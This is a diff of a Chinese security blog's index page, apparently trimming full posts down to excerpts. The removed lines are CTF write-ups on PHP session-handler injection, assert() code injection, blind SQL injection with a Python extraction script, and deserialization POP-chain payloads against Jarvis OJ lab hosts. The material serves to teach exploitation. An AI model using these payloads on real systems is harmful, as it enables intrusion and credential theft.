@@ -350,90 +350,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><strong>一、漏洞原理</strong></p>
-<p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化。</p>
-<p>处理器</p>
-<p>对应的存储格式</p>
-<p>php</p>
-<p>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</p>
-<p>php_binary</p>
-<p>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</p>
-<p>php_serialize</p>
-<p>(php&gt;=5.5.4)</p>
-<p>经过 serialize() 函数反序列处理的数组</p>
-<p>php.ini中默认session.serialize_handler为php_serialize。</p>
-<p>而PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p>
-<p>session.serialize_handler “php” PHP_INI_ALL</p>
-<p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：</p>
-<p>$_SESSION[‘ryat’] = ‘|O:8:”stdClass”:0:{}’;</p>
-<p>例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p>
-<p>a:1:{s:4:”ryat”;s:20:”|O:8:”stdClass”:0:{}”;}</p>
-<p>在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：</p>
-<p>// var_dump($_SESSION); array(1) { [“a:1:{s:4:”ryat”;s:20:””]=&gt; object(stdClass)#1 (0) { } }</p>
-<p>可以看到，通过注入 | 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）</p>
-<p><strong>二、实际利用</strong></p>
-<p>i）当 session.auto_start＝On 时：</p>
-<p>当配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p>
-<p>//foo.php if (ini_get(‘session.auto_start’)) { session_destroy(); } ini_set(‘session.serialize_handler’, ‘php_serialize’); session_start(); $_SESSION[‘ryat’] = $_GET[‘ryat’];</p>
-<p>当第一次访问该脚本，并提交数据如下：</p>
-<p>foo.php?ryat=|O:8:”stdClass”:0:{}</p>
-<p>脚本会按照 php_serialize 处理器的序列化格式存储数据：</p>
-<p>a:1:{s:4:”ryat”;s:20:”|O:8:”stdClass”:0:{}”;}</p>
-<p>当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）</p>
-<p>这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。</p>
-<p>ii）当 session.auto_start＝Off 时：</p>
-<p>当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p>
-<p>//foo1.php ini_set(‘session.serialize_handler’, ‘php_serialize’); session_start(); $_SESSION[‘ryat’] = $_GET[‘ryat’]; //foo2.php ini_set(‘session.serialize_handler’, ‘php’); //or session.serialize_handler set to php in php.ini session_start(); class ryat { var $hi; function __wakeup() { echo ‘hi’; } function __destruct() { echo $this-&gt;hi; } }</p>
-<p>当访问 foo1.php 时，提交数据如下：</p>
-<p>foo1.php?ryat=|O:4:”ryat”:1:{s:2:”hi”;s:4:”ryat”;}</p>
-<p>脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 __wakeup 方法和 __destruct 方法：）</p>
-<p>三、更深理解</p>
-<p>漏洞关键在于：</p>
-<p>1.脚本中设置的序列化处理器与php.ini设置的不同</p>
-<p>2.两个脚本注册session使用的序列化处理器不同</p>
-<p>（存储时序列化的和读取时反序列化的）处理器不同就会产生安全问问题。</p>
-<p>原因：</p>
-<p>未正确处理\\’|\\’。</p>
-<p>比如：以php_serilize方式存入的时候，构造出”|” 伪造的序列化值存入。但之后解析又是用的php处理器的话，那么将会反序列化伪造的数据（\\’|\\’之前当作键名，\\’|\\’之后当作键值）</p>
-<p>（L.N.: php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session）。</p>
-<p>通过什么方式将数据注入到session中呢？</p>
-<p>1.开发者本身将用户可控的数据传进了session（比如joomla等）</p>
-<p>2.通过配置不当可造成session被控。</p>
-<p>当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。</p>
-<p>构造表单：</p>
-<p>POST一个名为PHP_SESSION_UPLOAD_PROGRESS的值，便可以将上传的文件名写入session。</p>
-<!DOCTYPE html>
-
-<html>
-
-<head><meta name="generator" content="Hexo 3.9.0">
-
-<title>test XXE</title>
-
-<meta charset="utf-8">
-
-</head>
-
-<body>
-
-<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"><!--
-
-<p>不对字符编码–&gt;</p>
-<input type="hidden" name="PHP\_SESSION\_UPLOAD_PROGRESS" value="123" />
-
-<input type="file" name="file" />
-
-<input type="submit" value="go" />
-
-</form>
-
-</body>
-
-</html>
-
-<p>后面的难点在于构造出pop链达到自己想要的结果。</p>
-<p>参考：wooyun：ryat一篇文章</p>
---></form><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":80,"height":132},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":80,"height":132},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+          <p><strong>一、漏洞原理</strong></p><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化。</p><p>处理器</p><p>对应的存储格式</p><p>php</p><p>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</p><p>php_binary</p><p>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</p>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/10/18/Session序列化及反序列化处理器的安全问题/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -555,8 +481,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h5 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h5><p>描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：</p>
-<pre><code>&lt;?php
+          <h5 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h5><p>描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：</p><pre><code>&lt;?php
 if (isset($_GET[&apos;page&apos;])) {
     $page = $_GET[&apos;page&apos;];
 } else {
@@ -567,64 +492,16 @@ $file = &quot;templates/&quot; . $page . &quot;.php&quot;;
 assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
 // TODO: Make this look nice
 assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);
-?&gt;</code></pre><p>assert函数果断是常见的危险函数。如果第一个参数是字符串会当作为代码执行。构造payload： <code>http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls templates/;&quot;).&#39;</code> <code>http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;cat templates/flag.php;&quot;).&#39;</code> 也可以利用注释掉后面的语句构造payload。</p>
-<h5 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h5><p>上来一脸懵逼，post注入直接上sqlmap，发现有waf。然后sqlmap绕过waf还不会。。。只能手动了。。。 常规测试: 1.先常规测试一下： <code>username=admin&#39;#</code> 密码随便填，发现报错密码错误。验证了没有过滤’#，而且存在报错注入。 2.然后尝试: <code>admin&#39; order by 1#</code> 发现说用户不存在，那么就说明有waf过滤了空格或order或by中至少一个。 3.先猜测空格吧： 把空格换成/<strong>/，提示密码错误。ok绕过过滤空格。 4.测试一下万能密码： `admin’/</strong>/or/**/1=1#`提示密码错误，没有过滤or。但是存在密码验证，万能密码不能用。 常见的登陆漏洞类型： ①同时验证用户名和密码：</p>
-<pre><code>$sql = select * from users where    username=$usernmae and password=$password
-$result = mysql_query($sql);
-if($result) {
-    echo &quot;登陆成功&quot;;
-} else {
-echo &quot;登陆失败&quot;;
-}  </code></pre><p>②分布验证用户名和密码：</p>
-<pre><code>$sql = &quot;select password from users where username=&apos;$username&apos;&quot;
-$result = mysql_query($sql);
-if($result) {
-$row = mysql_fetch_row($result);
-$query_password = $row[$password];
-#对输入的$password进行变形
-$input_password = modify($passowrd);
-if($input_password == $query_password) {
-    echo &quot;登陆成功&quot;;
-} else {
-    echo &quot;密码错误&quot;;
-}
-
-} else {
-echo &quot;用户不存在&quot;;
-}</code></pre><p>分别尝试使用：</p>
-<pre><code>username=admin&amp;password=123456#密码错误
-username=user&amp;password=123456#用户名错误</code></pre><p>即此题为分步验证。 5.开始盲注 5.1查找表： <code>username=user&#39;/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123456</code>返回密码错误，那么说明在数据库中存在admin表。 5.2查找字段： <code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456</code> 返回密码错误，说明admin中存在username和password字段 <code>username=user&#39;/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456</code> 返回密码错误，说明在admin表中仅仅只存在一条记录。 得到pasaword长度： <code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>，通过二分法最终发现password长度为32.即采用md5来加密的。 py脚本跑一下：</p>
-<pre><code># -*- coding: utf-8 -*-
-
-import requests
-
-def main(): 
-    result=&quot;&quot;
-    url=&quot;http://web.jarvisoj.com:32787/login.php&quot;
-data={
-    &apos;username&apos;:&apos;xx&apos;,
-    &apos;password&apos;:&apos;123456&apos;
-}
-payload=&quot;&apos;/**/or/**/ascii(substr((select/**/password/**/from/**/admin),{0},1))&gt;{1}#&quot;
-chars=&quot;0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;
-for i in range(1,33):
-    for j in chars:
-        char_ascii=ord(j)
-        sql_payload=payload.format(i,char_ascii)
-        data[&apos;username&apos;]=sql_payload
-        #因为注入点在username上
-        rep=requests.post(url=url,data=data)
-        length=len(rep.text)
-        if length&gt;1191:
-            result+=j
-            print result
-            break
-print result
-print &quot;Done&quot;
-
-if __name__==&quot;__main__&quot;:
-main()</code></pre><p>得出MD5破解后登陆得flag。 在网上还流产一种解法比较骚： 常规测试后猜测： 通过用户名查询密码，然后如果查不出行就提示用户名错误，如果查出了且密码匹配不对，就提示密码错误。 然后直接用联合查询把后面带入user查询password得语句注释掉而是使用查询1： <code>username=admin123&#39;UNION(SELECT(1))#&amp;password=123</code> 返回密码错误，说明语句执行成功。然后尝试把密码改为1提交不正确，猜测后端使用了MD5加密进行比较。因此构造语句： <code>username=admin123&#39;UNION(SELECT(md5(123)))#&amp;password=123</code> 得flag。太骚啦~！！ 通过控制查询到得MD5值，再输入一个匹配得密码使其登陆成功。</p>
-
+?&gt;</code></pre>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/09/27/Jarvis OJ Web WriteUp(2)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -751,142 +628,21 @@ main()</code></pre><p>得出MD5破解后登陆得flag。 在网上还流产一�
 </li>
 <li><p>用户可控数据进行反序列化是存在危害的</p>
 </li>
-</ul>
-<h3 id="0x02-漏洞根源"><a href="#0x02-漏洞根源" class="headerlink" title="0x02.漏洞根源"></a>0x02.漏洞根源</h3><ul>
+</ul><h3 id="0x02-漏洞根源"><a href="#0x02-漏洞根源" class="headerlink" title="0x02.漏洞根源"></a>0x02.漏洞根源</h3><ul>
 <li><p>根本原因:程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。 </p>
 </li>
 <li><p>这个漏洞的形成是由于跟serialize和unserialize相关的magic函数违背正确利用的缘故。 在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
 </li>
 </ul>
-<h3 id="0x03-POP链及漏洞发现技巧"><a href="#0x03-POP链及漏洞发现技巧" class="headerlink" title="0x03.POP链及漏洞发现技巧"></a>0x03.POP链及漏洞发现技巧</h3><p>由于反序列化漏洞需要很多类甚至需要跨越不同的文件，所有一般只可能白盒审计才可能发现反序列化漏洞。黑盒一般发现不了，因为根本不知道内部具体的代码函数情况，不过可以想办法把源码弄到手。</p>
-<p> 默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。</p>
-<p> 找PHP链的基本思路: </p>
-<ul>
-<li><p>1.在各大流行的包中搜索 __wakeup() 和 __destruct() 函数 </p>
-</li>
-<li><p>2.追踪调用过程(反向找，正向验证) </p>
-</li>
-<li><p>3.手工构造 并验证 POP 链 </p>
-</li>
-<li><p>4.开发一个应用使用该库和自动加载机制,来测试exploit 一些对我们来说有用的POP链方法：</p>
-</li>
-</ul>
-<ul>
-<li>命令执行：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>文件操作：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-构造exploit的思路"><a href="#0x03-构造exploit的思路" class="headerlink" title="0x03.构造exploit的思路"></a>0x03.构造exploit的思路</h3><p>碰到php反序列化的问题时，如果参数可控，我们要反方向去寻找，即先找到调用我们想要调用的函数或方法，然后给可控的参数赋恰当的值，逆向推理，最后得出序列化字符串。</p>
-<ul>
-<li><p>1.寻找可能存在漏洞的应用 </p>
-</li>
-<li><p>2.在他所使用的库中寻找 POP gadgets </p>
-</li>
-<li><p>3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload </p>
-</li>
-<li><p>4.将序列化之后的payload发送到有漏洞web应用中进行测试 这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果</p>
-</li>
-</ul>
-<h3 id="0x04-利用反序列化漏洞"><a href="#0x04-利用反序列化漏洞" class="headerlink" title="0x04.利用反序列化漏洞"></a>0x04.利用反序列化漏洞</h3><p>利用两个条件：</p>
-<pre><code>1、程序中存在序列化字符串的输入点
-2、程序中存在可以利用的magic函数</code></pre><p>举个例子： 源码：</p>
-<pre><code>&lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-class gg
-{
-    private $gg;
-    public function __destruct()
-    {
-        $this-&gt;gg-&gt;get1();
-    }
-}
-class start
-{
-    private $start1;
-    private $start2;
-    public function get1()
-    {
-        $s1 = $this-&gt;start1;
-        $s2 = $this-&gt;start2;
-        $s1($s2);
-    }
-}
-
-class cat
-{
-    private $name = &quot;蛋黄&quot;;
-    private $color = &quot;橘色&quot;;
-    private $weight = &quot;5公斤&quot;;
-
-    public function getName()
-    {
-        return $this-&gt;name;
-    }
-
-    public function getColor()
-    {
-        return $this-&gt;color;
-    }
-
-    public function getWeight()
-    {
-        return $this-&gt;weight;
-    }
-
-    public function __invoke($args)
-    {
-        echo $args.&quot;不是函数&quot;;
-    }
-}
-
-class test2
-{
-    private $a;
-    public function __toString()
-    {
-        $this-&gt;a-&gt;getFlag();
-    }
-}
-
-class flag
-{
-    public function getFlag()
-    {
-        system(&apos;cat ../flag.txt&apos;);
-    }
-}
-$x = $_GET[&apos;x&apos;];
-if (isset($x)) {
-    unserialize($x);
-}
-?&gt;</code></pre><p>思路： 看到 unserialize（）知道是反序列化问题 从后往前逆推 </p>
-<ul>
-<li><p>1)想要得到flag 必须得调用flag 类里面的 getflag()方法 </p>
-</li>
-<li><p>2)往上看，发现test2 里面调用了getflag()方法 </p>
-</li>
-<li><p>3)但是这个getflag是a对应的方法，所以必须把a赋值为flag的类并且，getflag()函数在tostring 里面，所以要把test2类当作一个字符串来使用</p>
-</li>
-<li><p>4)上面cat 方法里面有关于字符串的调用，所以可以把args 赋为text2 的新类，但是想要调用echo 语句，必须得调用 invoke方法，所以呢，要把cat 当作一个函数来使用</p>
-</li>
-<li><p>5） 向上寻找函数的调用，发现start 里面有关于函数的调用，所以应该把s1赋值为cat的类，而s2 是函数的参数，联想到上面的__revoke，所以，可以把$s2赋值为test2的类 </p>
-</li>
-<li><p>6)想要实现上述，必须调用get1()方法，向上寻找，发现gg类中调用了get1()，但是却是变量gg的 方法，所以将变量gg赋值为start的类，就可以调用get1()方法了</p>
-<p>payload：</p>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $gg;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;gg = <span class="keyword">new</span> start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;gg-&gt;get1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $start1;</span><br><span class="line">    <span class="keyword">private</span> $start2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;start1 = <span class="keyword">new</span> cat();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;start2=<span class="keyword">new</span> test2();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;start1;</span><br><span class="line">        $s2 = <span class="keyword">$this</span>-&gt;start2;</span><br><span class="line">        $s1($s2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">"蛋黄"</span>;</span><br><span class="line">    <span class="keyword">private</span> $color = <span class="string">"橘色"</span>;</span><br><span class="line">    <span class="keyword">private</span> $weight = <span class="string">"5公斤"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getColor</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getWeight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">($args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $args.<span class="string">"不是函数"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> flag();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">'cat ../flag.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> gg;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b)).<span class="string">"&lt;br /    &gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>正向理思路：</p>
-<pre><code>1.首先选创建一个新类gg，销毁时调用方__destruct，调用get1()  
-2.get1()中，s1 是cat的新类，s2是test2的新类，s1当作函数，调用__invoke,s2 当作字符串，调用__tostring   
-3.然后调用__tostring,中的getflag(),执行system(),获得flag</code></pre>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/09/27/反序列化漏洞的成因及利用/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1013,8 +769,7 @@ if (isset($x)) {
 </li>
 <li><p>2.反序列化漏洞的成因及利用</p>
 </li>
-</ul>
-<h2 id="1-序列化、反序列化的理解"><a href="#1-序列化、反序列化的理解" class="headerlink" title="1.序列化、反序列化的理解"></a>1.序列化、反序列化的理解</h2><h3 id="0x01什么是序列化？"><a href="#0x01什么是序列化？" class="headerlink" title="0x01什么是序列化？"></a>0x01什么是序列化？</h3><ul>
+</ul><h2 id="1-序列化、反序列化的理解"><a href="#1-序列化、反序列化的理解" class="headerlink" title="1.序列化、反序列化的理解"></a>1.序列化、反序列化的理解</h2><h3 id="0x01什么是序列化？"><a href="#0x01什么是序列化？" class="headerlink" title="0x01什么是序列化？"></a>0x01什么是序列化？</h3><ul>
 <li><p>序列化： 将数据结构或对象转换成字节序列、二进制串的过程。 </p>
 </li>
 <li><p>反序列化：将在序列化过程中所生成的二进制串转换成数据结构或者对象的过程。</p>
@@ -1022,51 +777,15 @@ if (isset($x)) {
 <li><p><strong>注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。</strong></p>
 </li>
 </ul>
-<h3 id="0x02用处"><a href="#0x02用处" class="headerlink" title="0x02用处"></a>0x02用处</h3><p>序列化是让对象脱离运行环境的一种手段,可以有效的实现多平台之间的通信、对象持久化存储。</p>
-<p> 序列化成字节序列后，便于保存在内存、文件、数据库中，也可以理解为：序列化是指将一个对象转换成一个字符串，如：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:"Logfile":1:    &#123;s:8:"filename";s:10:"source.txt"   ;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03函数"><a href="#0x03函数" class="headerlink" title="0x03函数"></a>0x03函数</h3><pre><code>Java：ObjectOutputStream类的writeObject()、 readObject()
-PHP：serialize()、Unserialize()</code></pre><h3 id="0x04php序列字符串的模型意义"><a href="#0x04php序列字符串的模型意义" class="headerlink" title="0x04php序列字符串的模型意义"></a>0x04php序列字符串的模型意义</h3><pre><code>a - array 数组
-b - boolean布尔型
-d - double双精度型
-i - integer
-o - common object一般对象
-r - reference
-s - string
-C - custom object 自定义对象
-O - class
-N - null
-R - pointer reference
-U - unicode string unicode编码的字符串</code></pre><h3 id="0x05使用场景"><a href="#0x05使用场景" class="headerlink" title="0x05使用场景"></a>0x05使用场景</h3><p>1) 一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。 </p>
-<p>2) 在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。 比如： 最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。</p>
-<p> 以下都可能需要使用序列化：</p>
-<pre><code>• http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等
-• Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）
-• xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）
-• json(Jackson，fastjson) http请求中</code></pre><h3 id="0x06PHP中的magic函数"><a href="#0x06PHP中的magic函数" class="headerlink" title="0x06PHP中的magic函数"></a>0x06PHP中的magic函数</h3><p>magic函数以_开头。在特定的条件下会自动执行这些magic函数的内容，比如创建、销毁对象的时候。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">construct(), destruct()</span><br></pre></td></tr></table></figure>
-
-<p>构造函数与析构函数，创建类销毁类时自动调用。</p>
